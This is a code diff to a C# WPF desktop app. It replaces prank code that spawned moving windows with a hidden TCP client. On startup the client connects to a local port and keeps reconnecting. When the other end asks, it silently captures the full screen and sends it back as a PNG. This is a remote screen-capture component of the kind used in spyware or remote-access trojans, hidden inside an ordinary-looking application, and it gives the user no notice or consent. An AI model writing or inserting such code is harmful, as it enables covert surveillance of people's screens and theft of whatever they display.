@@ -2,8 +2,11 @@
 using System.Collections.Generic;
 using System.Configuration;
 using System.Data;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -21,6 +24,8 @@ namespace pisos
 	/// </summary>
 	public partial class App : Application
 	{
+		public TcpClient tcp;
+
 		private static BitmapImage LoadImage(byte[] imageData)
 		{
 			if (imageData == null || imageData.Length == 0) return null;
@@ -41,7 +46,7 @@ namespace pisos
 
 		private static Random smprnd = new Random();
 
-		private static void StartMoveThread(Window win, Image img)
+		private static void StartMoveThread(Window win, System.Windows.Controls.Image img)
 		{
 			int xd = 1;
 			int yd = -1;
@@ -107,16 +112,28 @@ namespace pisos
 			public Int32 Y;
 		};
 
-		public static Point GetMousePosition()
+		public static System.Windows.Point GetMousePosition()
 		{
 			Win32Point w32Mouse = new Win32Point();
 			GetCursorPos(ref w32Mouse);
-			return new Point(w32Mouse.X, w32Mouse.Y);
+			return new System.Windows.Point(w32Mouse.X, w32Mouse.Y);
 		}
 
 		private void Application_Startup(object sender, StartupEventArgs e)
 		{
-			Mouse.OverrideCursor = Cursors.Arrow;
+			tcp = new TcpClient();
+			ConnectTCP();
+			
+			/*Window w = new Window();
+			w.Width = 350;
+			w.Height = 300;
+			System.Windows.Controls.Image i = new System.Windows.Controls.Image();
+			//i.Width = w.Width;
+			//i.Height = w.Height;
+			i.Source = LoadImage(screenShot);
+			w.Content = i;
+			w.Show();*/
+			/*Mouse.OverrideCursor = Cursors.Arrow;
 			for (int i = 0; i < 5; i++)
 			{
 				Window win1 = new Window();
@@ -142,7 +159,7 @@ namespace pisos
 				StartMoveThread(win1, img);
 				Thread.Sleep(0);
 				Thread.Sleep(550);
-			}
+			}*/
 			/*Window dick = new Window();
 			dick.Width = SystemParameters.PrimaryScreenWidth;
 			dick.Height = SystemParameters.PrimaryScreenHeight;
@@ -151,6 +168,94 @@ namespace pisos
 			dick.WindowStyle = WindowStyle.None;
 			dick.AllowsTransparency = true;
 			dick.Background = null;*/
+		}
+
+		private void ConnectTCP()
+		{
+			if (tcp == null)
+				tcp = new TcpClient();
+			try
+			{
+				tcp.Connect("127.0.0.1", 9004);
+				NetworkStream stream = tcp.GetStream();
+				Thread rc = new Thread(new ParameterizedThreadStart(ReceiveMessage));
+				rc.Start(stream);
+			}
+			catch (Exception e)
+			{
+				Thread.Sleep(2000);
+				ConnectTCP();
+			}
+		}
+
+		private void ReceiveMessage(object _stream)
+		{
+			if (!(_stream is NetworkStream))
+				return;
+			NetworkStream stream = (NetworkStream)_stream;
+
+			byte[] sizeHeader = new byte[4];
+			uint size = 0;
+			byte[] content = new byte[1024 * 1024 * 2];
+			int offset = 4;
+			while (true)
+			{
+				try
+				{
+					do
+					{
+						if (sizeHeader.All((byte b) => {
+							return b == 0x00;
+						}))
+						{
+							stream.Read(sizeHeader, 0, 4);
+							size = BitConverter.ToUInt32(sizeHeader, 0);
+						}
+						else
+						{
+							offset += stream.Read(content, offset, (int)(size - offset + 4));
+							if (offset - 4 >= size)
+							{
+								if (content[0] == Protocol.SCREEN_REQUEST)
+								{
+									Bitmap image = new Bitmap((int)(SystemParameters.WorkArea.Right - SystemParameters.WorkArea.Left), (int)(SystemParameters.WorkArea.Bottom - SystemParameters.WorkArea.Top));
+									Graphics scr = Graphics.FromImage(image);
+									scr.CopyFromScreen((int)SystemParameters.WorkArea.Left, (int)SystemParameters.WorkArea.Top, 0, 0, image.Size);
+									byte[] screenShot;
+									using (var stream2 = new MemoryStream())
+									{
+										image.Save(stream2, ImageFormat.Png);
+										screenShot = stream2.ToArray();
+									}
+									byte[] response = new byte[1];
+									response[0] = Protocol.SCREEN_RESPONSE;
+									stream.Write(BitConverter.GetBytes((uint) (response.Length + screenShot.Length)), 0, 4);
+									stream.Write(response, 0, 1);
+									stream.Write(screenShot, 0, screenShot.Length);
+								}
+								for (int i = 0; i < sizeHeader.Length; i++)
+								{
+									sizeHeader[i] = 0x00;
+								}
+								size = 0;
+								for (int i = 0; i < content.Length; i++)
+								{
+									content[i] = 0x00;
+								}
+								offset = 4;
+							}
+						}
+					}
+					while (stream.DataAvailable);
+				}
+				catch (Exception e)
+				{
+					//Console.WriteLine(e.Message);
+					//Console.WriteLine(e.StackTrace);
+					Thread.Sleep(2000);
+					ConnectTCP();
+				}
+			}
 		}
 	}
 }
